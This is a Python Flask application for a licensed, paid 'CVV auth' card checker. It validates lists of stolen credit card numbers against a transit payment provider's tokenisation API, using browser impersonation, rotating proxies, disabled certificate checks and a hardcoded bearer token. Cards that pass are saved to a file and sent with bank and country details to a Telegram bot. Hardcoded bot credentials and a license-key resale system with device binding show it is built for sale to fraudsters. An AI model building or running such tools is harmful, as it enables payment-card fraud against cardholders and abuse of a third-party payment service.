import os
import io
import csv
import json
import random
import string
import urllib.request
import queue
import threading
import time
import base64
import struct
import hashlib
import hmac
from concurrent.futures import ThreadPoolExecutor, as_completed
from flask import Flask, request, jsonify, render_template, Response, send_file
from datetime import datetime, timedelta, timezone

from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding as cbc_padding

from curl_cffi import requests as cffi_requests
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)
DB_FILE = 'keys.json'
CONFIG_FILE = 'config.json'
LIVE_FILE = 'live.txt'
BIN_CACHE_FILE = 'bin_cache.json'

DEFAULT_ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD", "admin123")
DEFAULT_TG_TOKEN = "9138065167:AAHG3HmeQ8a_v7jiuUVqECR-m2W7Xc14fqg"
DEFAULT_TG_CHAT = "6516330870"
IDLE_PAUSE_THRESHOLD = 20

checker_queue = queue.Queue()
checker_stop_event = threading.Event()
db_lock = threading.Lock()
bin_lock = threading.Lock()
bin_server_cache = {}
OFFLINE_BIN_LOADED = False

def country_code_to_flag(iso2):
    if not iso2 or len(iso2) != 2 or not iso2.isalpha():
        return "🌐"
    return "".join(chr(0x1F1E6 + ord(c.upper()) - ord('A')) for c in iso2)

def load_local_bin_cache():
    if os.path.exists(BIN_CACHE_FILE):
        try:
            with open(BIN_CACHE_FILE, 'r', encoding='utf-8') as f:
                data = json.load(f)
                if isinstance(data, dict):
                    bin_server_cache.update(data)
        except Exception:
            pass

def save_local_bin_entry(bin_code, res_obj):
    with bin_lock:
        bin_server_cache[bin_code] = res_obj
        try:
            local_saved = {}
            if os.path.exists(BIN_CACHE_FILE):
                with open(BIN_CACHE_FILE, 'r', encoding='utf-8') as f:
                    local_saved = json.load(f)
            local_saved[bin_code] = res_obj
            with open(BIN_CACHE_FILE, 'w', encoding='utf-8') as f:
                json.dump(local_saved, f, indent=2)
        except Exception:
            pass

def preload_offline_bins():
    global OFFLINE_BIN_LOADED
    if OFFLINE_BIN_LOADED:
        return
    OFFLINE_BIN_LOADED = True
    load_local_bin_cache()
    csv_url = "https://raw.githubusercontent.com/venelinkochev/bin-list-data/master/bin-list-data.csv"
    try:
        r = requests.get(csv_url, timeout=15)
        if r.status_code == 200:
            reader = csv.DictReader(io.StringIO(r.text))
            for row in reader:
                b = (row.get("BIN") or "").strip()[:6]
                if len(b) == 6 and b not in bin_server_cache:
                    scheme = (row.get("Brand") or "VISA/MC").strip().upper()
                    c_type = (row.get("Type") or "CREDIT").strip().upper()
                    issuer = (row.get("Issuer") or "Issuer Not Listed").strip()
                    country = (row.get("CountryName") or "Unknown").strip()
                    iso2 = (row.get("isoCode2") or "").strip()
                    flag = country_code_to_flag(iso2)
                    bin_server_cache[b] = {
                        "success": True,
                        "scheme": scheme,
                        "type": c_type,
                        "country": f"{flag} {country}".strip(),
                        "bank": issuer
                    }
    except Exception:
        pass

threading.Thread(target=preload_offline_bins, daemon=True).start()

def resolve_bin_info(bin_code):
    bin_code = "".join(filter(str.isdigit, str(bin_code)))[:6]
    if len(bin_code) < 6:
        return {
            "success": False,
            "scheme": "UNKNOWN",
            "type": "CARD",
            "country": "🌐 Unknown",
            "bank": "Unknown Bank"
        }

    if bin_code in bin_server_cache:
        return bin_server_cache[bin_code]

    # Provider 1: HandyAPI (High Rate Limit + Accurate Issuer)
    try:
        r1 = requests.get(f"https://data.handyapi.com/bin/{bin_code}", timeout=4)
        if r1.status_code == 200:
            d1 = r1.json()
            if d1.get("Status") == "SUCCESS":
                c_info = d1.get("Country") or {}
                flag = country_code_to_flag(c_info.get("A2", ""))
                bank = (d1.get("Issuer") or "").strip() or "Issuer Not Listed"
                country = (c_info.get("Name") or "").strip() or "Unknown"
                res_obj = {
                    "success": True,
                    "scheme": (d1.get("Scheme") or "VISA/MC").upper(),
                    "type": (d1.get("Type") or "CREDIT").upper(),
                    "country": f"{flag} {country}".strip(),
                    "bank": bank
                }
                save_local_bin_entry(bin_code, res_obj)
                return res_obj
    except Exception:
        pass

    # Provider 2: Bincheck.io
    try:
        r2 = requests.get(f"https://api.bincheck.io/v1/{bin_code}", timeout=4)
        if r2.status_code == 200:
            d2 = r2.json()
            if d2 and (d2.get("scheme") or d2.get("country")):
                c_obj = d2.get("country") or {}
                b_obj = d2.get("bank") or {}
                bank = (b_obj.get("name") or "").strip() or "Issuer Not Listed"
                country = (c_obj.get("name") or "").strip() or "Unknown"
                emoji = c_obj.get("emoji") or country_code_to_flag(c_obj.get("alpha2", ""))
                res_obj = {
                    "success": True,
                    "scheme": (d2.get("scheme") or "VISA/MC").upper(),
                    "type": (d2.get("type") or "CREDIT").upper(),
                    "country": f"{emoji} {country}".strip(),
                    "bank": bank
                }
                save_local_bin_entry(bin_code, res_obj)
                return res_obj
    except Exception:
        pass

    # Provider 3: Binlist.net
    try:
        r3 = requests.get(f"https://lookup.binlist.net/{bin_code}", headers={'Accept-Version': '3'}, timeout=4)
        if r3.status_code == 200:
            d3 = r3.json()
            b_info = d3.get("bank") or {}
            c_info = d3.get("country") or {}
            if d3.get("scheme") or c_info.get("name"):
                emoji = c_info.get("emoji") or country_code_to_flag(c_info.get("alpha2", ""))
                res_obj = {
                    "success": True,
                    "scheme": (d3.get("scheme") or "VISA/MC").upper(),
                    "type": (d3.get("type") or "CREDIT").upper(),
                    "country": f"{emoji} {c_info.get('name', 'Unknown')}".strip(),
                    "bank": (b_info.get("name") or "").strip() or "Issuer Not Listed"
                }
                save_local_bin_entry(bin_code, res_obj)
                return res_obj
    except Exception:
        pass

    default_scheme = "VISA" if bin_code.startswith("4") else (
        "MASTERCARD" if bin_code.startswith(("5", "2")) else (
            "AMEX" if bin_code.startswith("3") else "VISA/MC"
        )
    )
    return {
        "success": False,
        "scheme": default_scheme,
        "type": "CARD",
        "country": "🌐 Unknown Country",
        "bank": "🏦 Unknown Bank"
    }

def load_config():
    if not os.path.exists(CONFIG_FILE):
        return {
            "admin_password": DEFAULT_ADMIN_PASSWORD,
            "key_tg_token": DEFAULT_TG_TOKEN,
            "key_tg_chat": DEFAULT_TG_CHAT,
            "live_tg_token": "",
            "live_tg_chat": ""
        }
    try:
        with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
            cfg = json.load(f)
            if "admin_password" not in cfg:
                cfg["admin_password"] = DEFAULT_ADMIN_PASSWORD
            return cfg
    except Exception:
        return {
            "admin_password": DEFAULT_ADMIN_PASSWORD,
            "key_tg_token": DEFAULT_TG_TOKEN,
            "key_tg_chat": DEFAULT_TG_CHAT,
            "live_tg_token": "",
            "live_tg_chat": ""
        }

def save_config(cfg):
    with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
        json.dump(cfg, f, indent=4)

def send_telegram_alert(token, chat_id, message):
    if not token or not chat_id:
        return
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    payload = json.dumps({
        "chat_id": chat_id,
        "text": message,
        "parse_mode": "HTML"
    }).encode('utf-8')
    try:
        req = urllib.request.Request(url, data=payload, headers={'Content-Type': 'application/json'})
        urllib.request.urlopen(req, timeout=5)
    except Exception:
        pass

def load_db():
    if not os.path.exists(DB_FILE):
        return {}
    try:
        with open(DB_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except Exception:
        return {}

def save_db(data):
    with open(DB_FILE, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=4)

def calculate_duration_seconds(amount, unit):
    if not amount or unit == 'lifetime':
        return None
    try:
        val = int(amount)
        if unit == 'minutes':
            return val * 60
        elif unit == 'hours':
            return val * 3600
        elif unit == 'days':
            return val * 86400
        elif unit == 'months':
            return val * 30 * 86400
        elif unit == 'years':
            return val * 365 * 86400
        return None
    except Exception:
        return None

def sync_key_usage(key_info, now_ts, active_ping=False, force_pause=False):
    if "remaining_seconds" not in key_info:
        exp_ts = key_info.get("expires_ts")
        if exp_ts is None:
            key_info["remaining_seconds"] = None
        else:
            key_info["remaining_seconds"] = max(0, int(exp_ts - now_ts))
        key_info["redeemed"] = bool(key_info.get("device_id"))
        key_info["is_paused"] = True
        key_info["last_active_ts"] = None

    rem_sec = key_info.get("remaining_seconds")
    if rem_sec is None:
        if active_ping:
            key_info["redeemed"] = True
            key_info["is_paused"] = False
            key_info["last_active_ts"] = now_ts
        elif force_pause:
            key_info["is_paused"] = True
            key_info["last_active_ts"] = None
        else:
            last_ts = key_info.get("last_active_ts")
            if not last_ts or (now_ts - last_ts) > IDLE_PAUSE_THRESHOLD:
                key_info["is_paused"] = True
        return key_info

    if not key_info.get("redeemed", False) and not active_ping:
        key_info["is_paused"] = True
        key_info["last_active_ts"] = None
        return key_info

    last_ts = key_info.get("last_active_ts")
    if last_ts is not None and not key_info.get("is_paused", True):
        delta = now_ts - last_ts
        if 0 < delta <= IDLE_PAUSE_THRESHOLD:
            rem_sec = max(0, rem_sec - delta)
            key_info["remaining_seconds"] = rem_sec
            key_info["last_active_ts"] = now_ts
        elif delta > IDLE_PAUSE_THRESHOLD:
            key_info["is_paused"] = True
            key_info["last_active_ts"] = None

    if rem_sec <= 0:
        key_info["remaining_seconds"] = 0
        key_info["status"] = "expired"
        key_info["is_paused"] = True
        key_info["last_active_ts"] = None
        return key_info

    if force_pause:
        key_info["is_paused"] = True
        key_info["last_active_ts"] = None
    elif active_ping:
        key_info["redeemed"] = True
        key_info["is_paused"] = False
        key_info["last_active_ts"] = now_ts

    return key_info

def save_live_card(card_line, detail, bin_info=None):
    try:
        with open(LIVE_FILE, "a", encoding="utf-8") as f:
            f.write(f"{card_line} | {detail}\n")
        
        cfg = load_config()
        live_token = cfg.get("live_tg_token", "").strip()
        live_chat = cfg.get("live_tg_chat", "").strip()
        if live_token and live_chat:
            parts = card_line.split("|")
            mo = parts[1].strip() if len(parts) > 1 else ""
            yr = parts[2].strip() if len(parts) > 2 else ""
            date_str = f"{mo}/{yr}"

            scheme = bin_info.get("scheme", "VISA/MC") if bin_info else "VISA/MC"
            card_type = bin_info.get("type", "CREDIT") if bin_info else "CREDIT"
            bank = bin_info.get("bank", "Unknown Bank") if bin_info else "Unknown Bank"
            country = bin_info.get("country", "Unknown") if bin_info else "Unknown"

            tg_msg = (
                f"<b>🔥 CVV AUTH HIT 🔥</b>\n\n"
                f"💳 <b>Card:</b> <code>{card_line}</code>\n"
                f"🌐 <b>Gateway:</b> Littlepay (Auth)\n"
                f"💬 <b>Response:</b> {detail}\n"
                f"🏷️ <b>Type:</b> {scheme} - {card_type}\n"
                f"📅 <b>Date:</b> {date_str}\n"
                f"🏛️ <b>Bank:</b> {bank}\n"
                f"🌍 <b>Country:</b> {country}"
            )
            send_telegram_alert(live_token, live_chat, tg_msg)
    except Exception:
        pass

@app.route('/')
def home():
    return render_template('admin.html')

@app.route('/checker')
def checker_page():
    return render_template('checker.html')

@app.route('/api/login', methods=['POST'])
def api_login():
    data = request.get_json() or {}
    cfg = load_config()
    if data.get('password') == cfg.get("admin_password", DEFAULT_ADMIN_PASSWORD):
        return jsonify({"success": True})
    return jsonify({"success": False, "message": "Incorrect password!"})

@app.route('/api/admin/password', methods=['POST'])
def change_admin_password():
    data = request.get_json() or {}
    current_pw = data.get('current_password', '')
    new_pw = data.get('new_password', '').strip()

    cfg = load_config()
    saved_pw = cfg.get("admin_password", DEFAULT_ADMIN_PASSWORD)

    if current_pw != saved_pw:
        return jsonify({"success": False, "message": "Current password is incorrect!"}), 403
    if len(new_pw) < 4:
        return jsonify({"success": False, "message": "New password must be at least 4 characters."}), 400

    cfg["admin_password"] = new_pw
    save_config(cfg)
    return jsonify({"success": True, "message": "Admin password updated successfully!"})

@app.route('/api/config', methods=['GET', 'POST'])
def handle_config():
    if request.method == 'GET':
        cfg = load_config()
        return jsonify({
            "success": True,
            "config": {
                "live_tg_token": cfg.get("live_tg_token", ""),
                "live_tg_chat": cfg.get("live_tg_chat", "")
            }
        })
    elif request.method == 'POST':
        data = request.get_json() or {}
        cfg = load_config()
        cfg["live_tg_token"] = data.get("live_tg_token", "").strip()
        cfg["live_tg_chat"] = data.get("live_tg_chat", "").strip()
        save_config(cfg)
        return jsonify({"success": True})

@app.route('/api/bin/<bin_code>')
def api_bin_lookup(bin_code):
    return jsonify(resolve_bin_info(bin_code))

@app.route('/api/keys', methods=['GET', 'POST'])
def handle_keys():
    with db_lock:
        keys_data = load_db()
        now_ts = int(datetime.now(timezone.utc).timestamp())

        if request.method == 'GET':
            result = []
            for key, info in keys_data.items():
                sync_key_usage(info, now_ts, active_ping=False)
                result.append({
                    "key": key,
                    "remaining_seconds": info.get('remaining_seconds'),
                    "redeemed": info.get('redeemed', False),
                    "is_paused": info.get('is_paused', True),
                    "status": info.get('status', 'active'),
                    "device_id": info.get('device_id', '')
                })
            save_db(keys_data)
            return jsonify({"success": True, "keys": result})

        elif request.method == 'POST':
            data = request.get_json() or {}
            custom_key = str(data.get('key', '')).strip()
            duration_val = data.get('duration_val', '1')
            duration_unit = data.get('duration_unit', 'lifetime')
            quantity = min(max(int(data.get('quantity', 1)), 1), 100)
            notify_tg = data.get('notify_tg', True)

            dur_seconds = calculate_duration_seconds(duration_val, duration_unit)
            created_keys = []

            if custom_key and quantity == 1:
                if custom_key in keys_data:
                    return jsonify({"success": False, "message": "Key already exists!"})
                keys_data[custom_key] = {
                    "remaining_seconds": dur_seconds,
                    "redeemed": False,
                    "is_paused": True,
                    "last_active_ts": None,
                    "status": "active",
                    "device_id": ""
                }
                created_keys.append(custom_key)
            else:
                prefix = custom_key if custom_key else "KYU"
                for _ in range(quantity):
                    while True:
                        part1 = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
                        part2 = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
                        new_key = f"{prefix}-{part1}-{part2}"
                        if new_key not in keys_data:
                            break
                    keys_data[new_key] = {
                        "remaining_seconds": dur_seconds,
                        "redeemed": False,
                        "is_paused": True,
                        "last_active_ts": None,
                        "status": "active",
                        "device_id": ""
                    }
                    created_keys.append(new_key)

            save_db(keys_data)

            if notify_tg and created_keys:
                cfg = load_config()
                token = cfg.get("key_tg_token", DEFAULT_TG_TOKEN)
                chat_id = cfg.get("key_tg_chat", DEFAULT_TG_CHAT)
                exp_label = f"{duration_val} {duration_unit.capitalize()}" if dur_seconds else "Lifetime"
                keys_formatted = "\n".join([f"<code>{k}</code>" for k in created_keys])
                tg_msg = (
                    f"<b>⚡ KYU CVV AUTH - LICENSE GENERATOR ⚡</b>\n\n"
                    f"📦 <b>Generated:</b> <code>{len(created_keys)} key(s)</code>\n"
                    f"⏳ <b>Duration:</b> <code>{exp_label} (Starts on Redeem)</code>\n\n"
                    f"{keys_formatted}"
                )
                send_telegram_alert(token, chat_id, tg_msg)

            return jsonify({"success": True, "keys": created_keys})

@app.route('/api/keys/<path:key_id>', methods=['PUT', 'DELETE'])
def modify_key(key_id):
    with db_lock:
        keys_data = load_db()
        if key_id not in keys_data:
            return jsonify({"success": False, "message": "Key not found"}), 404

        now_ts = int(datetime.now(timezone.utc).timestamp())

        if request.method == 'DELETE':
            del keys_data[key_id]
            save_db(keys_data)
            return jsonify({"success": True, "message": "Deleted"})
        elif request.method == 'PUT':
            data = request.get_json() or {}
            action = data.get('action')
            if action == 'reset_hwid':
                keys_data[key_id]['device_id'] = ""
            elif action == 'toggle_pause':
                sync_key_usage(keys_data[key_id], now_ts, active_ping=False, force_pause=True)
            else:
                new_seconds = calculate_duration_seconds(data.get('duration_val', '1'), data.get('duration_unit', 'lifetime'))
                keys_data[key_id]['remaining_seconds'] = new_seconds
                keys_data[key_id]['status'] = 'active'
                if not keys_data[key_id].get('redeemed', False):
                    keys_data[key_id]['is_paused'] = True
                    keys_data[key_id]['last_active_ts'] = None
                else:
                    keys_data[key_id]['last_active_ts'] = now_ts
            save_db(keys_data)
            return jsonify({"success": True, "message": "Updated"})

@app.route('/verify.php', methods=['POST'])
def verify_key():
    data = request.get_json() or {}
    incoming_key = str(data.get('key', '')).strip().upper()
    device_id = str(data.get('device_id', '')).strip()
    action = str(data.get('action', 'ping')).strip().lower()

    if not incoming_key:
        return jsonify({"success": False, "message": "Please enter a license key."})
    
    with db_lock:
        keys_data = load_db()
        matched_key = None
        for k in keys_data.keys():
            if k.strip().upper() == incoming_key:
                matched_key = k
                break

        if not matched_key:
            return jsonify({"success": False, "message": "Invalid license key."})

        key_info = keys_data[matched_key]
        now_ts = int(datetime.now(timezone.utc).timestamp())

        if action == 'pause':
            sync_key_usage(key_info, now_ts, active_ping=False, force_pause=True)
            save_db(keys_data)
            return jsonify({
                "success": True,
                "paused": True,
                "remaining_seconds": key_info.get("remaining_seconds")
            })

        stored_device = key_info.get('device_id', '')
        if stored_device and stored_device != device_id:
            return jsonify({"success": False, "message": "HWID mismatch (Bound to another device)."})

        if not stored_device:
            key_info['device_id'] = device_id

        sync_key_usage(key_info, now_ts, active_ping=True, force_pause=False)

        if key_info.get('status') != 'active':
            save_db(keys_data)
            return jsonify({"success": False, "message": "License key has expired."})

        save_db(keys_data)
        return jsonify({
            "success": True,
            "key": matched_key,
            "remaining_seconds": key_info.get('remaining_seconds'),
            "redeemed": key_info.get('redeemed', True),
            "is_paused": key_info.get('is_paused', False)
        })

TOKENISATION_BASE = "https://web.uk.littlepay.com"
PARTICIPANT_ID = "coast-rta"
FALLBACK_BEARER_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjYXJkaG9sZGVyQXV0aFR5cGUiOiJDVlYiLCJhZGRyZXNzUmVxdWlyZWRGb3JWZXJpZmljYXRpb24iOmZhbHNlLCJwYXJ0aWNpcGFudF9pZCI6ImNvYXN0LXJ0YSIsImV4cCI6MTc5NDU3MjQwMiwibmFtZSI6IkNBUkRfVE9LRU5JU0FUSU9OIn0.Fin7fy3YesZsGCNe-owY9x6-RGK2qGykGSIYhbJDE8k"

class WebProxyPool:
    def __init__(self, raw_proxies):
        self.proxies = [p.strip() for p in raw_proxies if p.strip()]
        self.i = 0
        self.lock = threading.Lock()

    def next(self):
        if not self.proxies:
            return None
        with self.lock:
            p = self.proxies[self.i % len(self.proxies)]
            self.i += 1
        if "://" not in p:
            parts = p.split(":")
            if len(parts) == 2:
                p = f"http://{parts[0]}:{parts[1]}"
            elif len(parts) == 4:
                h, po, u, pw = parts
                safe_pw = urllib.parse.quote(pw, safe='')
                p = f"http://{u}:{safe_pw}@{h}:{po}"
        return {"http": p, "https": p}

class DynamicTokenManager:
    def __init__(self, initial_token, proxy_pool):
        self.token = initial_token
        self.proxy_pool = proxy_pool

    def get_token(self, session=None, proxy_str=None):
        url = f"{TOKENISATION_BASE}/api/v1/customer/tokens/request-token"
        headers = {
            "Authorization": f"Bearer {self.token}",
            "Content-Type": "application/json;charset=UTF-8",
            "Accept": "application/json, text/plain, */*",
            "Origin": "https://coastrta.littlepay.com",
            "Referer": "https://coastrta.littlepay.com/"
        }
        body = {"request_access": "CARD_TOKENISATION", "external_participant_id": PARTICIPANT_ID}
        if proxy_str is None and self.proxy_pool:
            p_dict = self.proxy_pool.next()
            proxy_str = p_dict["http"] if p_dict else None
        try:
            req_session = session if session else cffi_requests.Session(impersonate="chrome")
            resp = req_session.post(url, json=body, headers=headers, proxy=proxy_str, timeout=10, verify=False)
            if resp.status_code == 200:
                data = resp.json()
                new_token = data.get("access_token")
                if new_token:
                    self.token = new_token
                    return new_token
        except Exception:
            pass
        return self.token

def test_proxy(proxy_dict):
    try:
        r = requests.get("https://api.ipify.org?format=json", proxies=proxy_dict, timeout=5, verify=False)
        return r.status_code == 200
    except Exception:
        return False

def create_native_jwe(plaintext: str, key_entry: dict) -> str:
    mod_hex = key_entry["modulus"].replace(":", "")
    exp_int = int(key_entry["exponent"])
    
    n_bytes = bytes.fromhex(mod_hex)
    e_bytes = exp_int.to_bytes((exp_int.bit_length() + 7) // 8, byteorder='big')
    
    public_numbers = rsa.RSAPublicNumbers(
        e=int.from_bytes(e_bytes, 'big'),
        n=int.from_bytes(n_bytes, 'big')
    )
    public_key = public_numbers.public_key()
    
    cek = os.urandom(32)
    iv = os.urandom(16)
    
    encrypted_key = public_key.encrypt(
        cek,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA1()),
            algorithm=hashes.SHA1(),
            label=None
        )
    )
    
    header = {"alg": "RSA-OAEP", "enc": "A128CBC-HS256"}
    protected_json = json.dumps(header, separators=(",", ":"))
    
    def b64url(b):
        return base64.urlsafe_b64encode(b).rstrip(b"=").decode("ascii")
        
    protected_b64 = b64url(protected_json.encode("utf-8"))
    
    mac_key = cek[:16]
    enc_key = cek[16:]
    
    padder = cbc_padding.PKCS7(128).padder()
    padded_data = padder.update(plaintext.encode("utf-8")) + padder.finalize()
    
    cipher = Cipher(algorithms.AES(enc_key), modes.CBC(iv))
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(padded_data) + encryptor.finalize()
    
    aad = protected_b64.encode("ascii")
    al = struct.pack(">Q", len(aad) * 8)
    
    hmac_input = aad + iv + ciphertext + al
    h = hmac.new(mac_key, hmac_input, hashlib.sha256).digest()
    tag = h[:16]
    
    return f"{protected_b64}.{b64url(encrypted_key)}.{b64url(iv)}.{b64url(ciphertext)}.{b64url(tag)}"

def check_single_card(card_line, proxy_pool, token_manager):
    parts = card_line.split("|")
    if len(parts) < 3:
        return 2, "ERROR", "Invalid format (cc|mo|yr|cvv)"
    
    cc, mo, yr = parts[0].strip(), parts[1].strip(), parts[2].strip()
    cvv = parts[3].strip() if len(parts) > 3 else ""
    expiry = f"{mo}/{yr[-2:]}"
    card_type = "visa" if cc.startswith("4") else "mastercard"

    session = cffi_requests.Session(impersonate="chrome")
    p_dict = proxy_pool.next() if proxy_pool else None
    proxy_str = p_dict["http"] if p_dict else None

    try:
        current_token = token_manager.get_token(session=session, proxy_str=proxy_str)

        headers = {
            "Authorization": f"Bearer {current_token}",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Origin": "https://coastrta.littlepay.com",
            "Referer": "https://coastrta.littlepay.com/",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "cross-site",
        }

        r = session.get(
            f"{TOKENISATION_BASE}/api/v1/tokenisation/public-keys", 
            headers=headers, 
            proxy=proxy_str,
            timeout=10,
            verify=False
        )
        if r.status_code != 200:
            return 2, "ERROR", f"HTTP {r.status_code} (Cloudflare 403 / WAF Block)"
        
        keys = r.json().get("list", [])
        if not keys:
            return 2, "ERROR", "No public keys"
        key_entry = random.choice(keys)

        payload = {"ch_name": "", "cc_num": cc, "card_type": card_type, "card_date": expiry, "ch_country": "US"}
        if cvv:
            payload["card_cvv"] = cvv

        jwe_token = create_native_jwe(json.dumps(payload, separators=(",", ":")), key_entry)

        auth_headers = headers.copy()
        auth_headers["Content-Type"] = "application/json"

        r2 = session.post(
            f"{TOKENISATION_BASE}/api/v1/tokenisation/authenticate",
            headers=auth_headers,
            json={
                "key_id": key_entry["id"],
                "encrypted_payment_data": jwe_token,
                "payment_token_type": "CARD_DATA",
                "save_card": False
            },
            proxy=proxy_str,
            timeout=10,
            verify=False
        )
        
        try:
            res_data = r2.json()
        except Exception:
            res_data = {"status": "ERROR"}

        status = str(res_data.get("status") or res_data.get("state") or "").upper()
        if status in ("FAILED", "DECLINED", "REJECTED", "ERROR", "UNAUTHENTICATED"):
            return 1, "DEAD", f"CARD_DECLINED ({status})"
        
        auth_id = res_data.get("authentication_id")
        if not auth_id:
            return 1, "DEAD", "CARD_DECLINED"

        r3 = session.get(
            f"{TOKENISATION_BASE}/api/v1/tokenisation/authenticate/{auth_id}",
            headers=headers,
            proxy=proxy_str,
            timeout=10,
            verify=False
        )
        
        try:
            tok_data = r3.json()
        except Exception:
            tok_data = {}

        tok_status = str(tok_data.get("status") or tok_data.get("state") or "").upper()
        if tok_status in ("FAILED", "DECLINED", "REJECTED", "ERROR"):
            return 1, "DEAD", f"CARD_DECLINED ({tok_status})"

        if tok_data.get("authenticated_payment_token"):
            return 0, "LIVE", "APPROVED"
        
        return 1, "DEAD", "DECLINED"

    except Exception as e:
        err_msg = str(e).encode('ascii', 'ignore').decode('ascii')
        return 2, "ERROR", err_msg or "Exception"
    finally:
        try:
            session.close()
        except Exception:
            pass

def background_worker(cards, proxies_list, max_threads):
    raw_pool = WebProxyPool(proxies_list)
    valid_proxies = []
    total_proxies = len(raw_pool.proxies)

    if total_proxies > 0:
        checker_queue.put({"status_msg": f"Testing {total_proxies} proxy/proxies..."})
        for p_str in raw_pool.proxies:
            p = p_str
            if "://" not in p:
                parts = p.split(":")
                if len(parts) == 2:
                    p = f"http://{parts[0]}:{parts[1]}"
                elif len(parts) == 4:
                    h, po, u, pw = parts
                    safe_pw = urllib.parse.quote(pw, safe='')
                    p = f"http://{u}:{safe_pw}@{h}:{po}"
            p_dict = {"http": p, "https": p}
            if test_proxy(p_dict):
                valid_proxies.append(p_str)
        
        proxy_pool = WebProxyPool(valid_proxies) if valid_proxies else None
        checker_queue.put({"status_msg": f"Proxy check complete: {len(valid_proxies)}/{total_proxies} active. Starting threads..."})
    else:
        proxy_pool = None
        checker_queue.put({"status_msg": "Running in multi-threaded proxyless mode..."})

    token_manager = DynamicTokenManager(FALLBACK_BEARER_TOKEN, proxy_pool)
    counts = {"checked": 0, "live": 0, "dead": 0, "error": 0, "total": len(cards)}
    counts_lock = threading.Lock()

    def worker_task(card):
        if checker_stop_event.is_set():
            return
        
        code, status, detail = check_single_card(card, proxy_pool, token_manager)
        bin_code = card.split("|")[0].strip()[:6]
        bin_meta = resolve_bin_info(bin_code)
        
        with counts_lock:
            counts["checked"] += 1
            if code == 0:
                counts["live"] += 1
                save_live_card(card, detail, bin_meta)
            elif code == 1:
                counts["dead"] += 1
            else:
                counts["error"] += 1

            checker_queue.put({
                "card": card,
                "status": status,
                "code": code,
                "detail": detail,
                "bin_info": bin_meta,
                **counts
            })

    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = [executor.submit(worker_task, card) for card in cards]
        for _ in as_completed(futures):
            if checker_stop_event.is_set():
                break

    checker_queue.put({"finished": True, **counts})

@app.route('/api/checker/start', methods=['POST'])
def api_checker_start():
    global checker_queue, checker_stop_event
    checker_stop_event.set()
    while not checker_queue.empty():
        try:
            checker_queue.get_nowait()
        except Exception:
            break

    checker_stop_event = threading.Event()
    data = request.get_json() or {}
    
    cards = [line.strip() for line in data.get('cards', '').split('\n') if line.strip()]
    proxies = [p.strip() for p in data.get('proxies', '').split('\n') if p.strip()]
    
    try:
        threads_val = int(data.get('threads', 15))
    except ValueError:
        threads_val = 15

    if not cards:
        return jsonify({"success": False, "message": "No cards provided"}), 400

    threading.Thread(target=background_worker, args=(cards, proxies, threads_val), daemon=True).start()
    return jsonify({"success": True})

@app.route('/api/checker/stop', methods=['POST'])
def api_checker_stop():
    checker_stop_event.set()
    return jsonify({"success": True})

@app.route('/api/checker/poll')
def api_checker_poll():
    items = []
    while not checker_queue.empty() and len(items) < 50:
        try:
            items.append(checker_queue.get_nowait())
        except queue.Empty:
            break
    return jsonify({"success": True, "items": items})

@app.route('/api/checker/stream')
def api_checker_stream():
    def event_stream():
        while not checker_stop_event.is_set():
            try:
                data = checker_queue.get(timeout=1.0)
                yield f"data: {json.dumps(data)}\n\n"
                if data.get("finished"):
                    break
            except queue.Empty:
                yield ": keepalive\n\n"
    return Response(event_stream(), mimetype="text/event-stream")

@app.route('/api/checker/export')
def api_checker_export():
    if os.path.exists(LIVE_FILE):
        return send_file(LIVE_FILE, as_attachment=True, download_name="live.txt")
    return "No live cards found.", 404

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, threaded=True)
